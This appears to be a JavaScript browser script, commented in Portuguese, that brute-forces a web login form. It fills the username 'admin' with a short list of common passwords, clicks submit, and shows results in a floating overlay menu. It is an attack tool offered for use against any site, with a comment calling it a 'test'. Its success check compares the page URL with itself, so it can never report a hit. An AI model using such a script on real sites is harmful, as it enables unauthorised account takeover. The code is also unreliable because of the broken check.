// Script de teste de força bruta com menu flutuante
// Ajuste os seletores e a lista de senhas conforme necessário

// Configurações
const usernameFieldId = 'username'; // ID do campo de usuário
const passwordFieldId = 'password'; // ID do campo de senha
const submitButtonId = 'submit'; // ID do botão de submit
const targetUsername = 'admin'; // Usuário alvo para o teste
const passwords = ['password', '123456', 'admin', 'test', 'qwerty']; // Lista de senhas para testar
const delayBetweenAttempts = 1000; // Delay entre tentativas (em ms)

// Cria o menu flutuante
function createFloatingMenu() {
    const menu = document.createElement('div');
    menu.id = 'bruteForceMenu';
    menu.style.position = 'fixed';
    menu.style.top = '10px';
    menu.style.right = '10px';
    menu.style.backgroundColor = '#333';
    menu.style.color = '#fff';
    menu.style.padding = '10px';
    menu.style.borderRadius = '5px';
    menu.style.maxWidth = '300px';
    menu.style.maxHeight = '400px';
    menu.style.overflowY = 'auto';
    menu.style.zIndex = '9999';
    menu.style.fontFamily = 'Arial, sans-serif';
    menu.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)';
    menu.innerHTML = '<h3 style="margin: 0 0 10px;">Teste de Força Bruta</h3><div id="results"></div>';
    document.body.appendChild(menu);
}

// Atualiza o menu com resultados
function updateMenu(message, isSuccess = false) {
    const resultsDiv = document.getElementById('results');
    const result = document.createElement('p');
    result.style.margin = '5px 0';
    result.style.color = isSuccess ? '#0f0' : '#fff';
    result.textContent = message;
    resultsDiv.appendChild(result);
    resultsDiv.scrollTop = resultsDiv.scrollHeight; // Auto-scroll para o último resultado
}

// Função para simular o login
function tryLogin(username, password) {
    return new Promise((resolve) => {
        const usernameInput = document.getElementById(usernameFieldId);
        const passwordInput = document.getElementById(passwordFieldId);
        const submitButton = document.getElementById(submitButtonId);

        if (!usernameInput || !passwordInput || !submitButton) {
            updateMenu('Erro: Campos ou botão não encontrados. Verifique os IDs.', false);
            resolve(false);
            return;
        }

        usernameInput.value = username;
        passwordInput.value = password;

        submitButton.click();

        setTimeout(() => {
            const success = window.location.href !== window.location.href; // Ajuste a lógica conforme necessário
            resolve(success);
        }, delayBetweenAttempts);
    });
}

// Função principal para executar o teste de força bruta
async function bruteForce() {
    createFloatingMenu();
    updateMenu('Iniciando teste de força bruta...');
    
    for (let password of passwords) {
        updateMenu(`Testando senha: ${password}`);
        const success = await tryLogin(targetUsername, password);
        if (success) {
            updateMenu(`Sucesso! Senha encontrada: ${password}`, true);
            return;
        } else {
            updateMenu(`Falha com a senha: ${password}`);
        }
    }
    updateMenu('Teste concluído. Nenhuma senha funcionou.');
}

// Inicia o teste
bruteForce();
